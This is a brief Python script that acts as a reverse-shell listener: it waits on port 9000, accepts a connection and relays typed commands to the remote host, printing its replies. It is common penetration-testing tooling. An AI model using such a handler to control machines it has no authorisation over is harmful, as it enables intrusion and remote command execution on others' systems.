import socket
import time
import threading

thread_stdin_lock = threading.Lock()
thread_stdin_target = 0

def reverse_shell_connection(ip: str, port: int, id: int):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print(f"Listening on {port}")
    conn, addr = s.accept()
    print(f"Connection from {addr}")

    time.sleep(0.5)
    output = conn.recv(1024).decode()

    while True:
        in_focus = True
        with thread_stdin_lock:
            in_focus = thread_stdin_target == id

        if in_focus:
            cmd = input()
            conn.send(cmd.encode() + b"\n")
            time.sleep(0.5)
            output = conn.recv(1024).decode()
            print(output, end="")

t = threading.Thread(target=reverse_shell_connection, args=('0.0.0.0', 9000, 1))
t.start()

input("Press wahtever to join the thread")
with thread_stdin_lock:
    thread_stdin_target = 1

t.join()

